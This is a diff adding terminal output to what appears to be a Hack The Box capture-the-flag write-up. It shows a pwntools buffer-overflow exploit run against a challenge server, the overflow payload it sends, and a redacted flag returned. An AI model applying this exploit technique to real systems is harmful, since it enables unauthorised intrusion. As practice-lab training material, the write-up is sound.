@@ -202,4 +202,16 @@ server.sendlineafter(":", exploit)
 server.interactive()
 ```
 
+```shell
+python pwn_exploit.py                                                                                             main 
+[+] Opening connection to 178.62.13.127 on port 30495: Done
+/home/darthv/git/badorius/vulnhub/0xDiablos/FootHold/venv/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  res = self.recvuntil(delim, timeout=timeout)
+[*] Switching to interactive mode
+ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\xde\xc0\xde
+HTB{XXXXXXXXXXXXXXXXXXXXXXX}$       [*] Got EOF while reading in interactive
+$  
+```
 
+Voilà!!! 
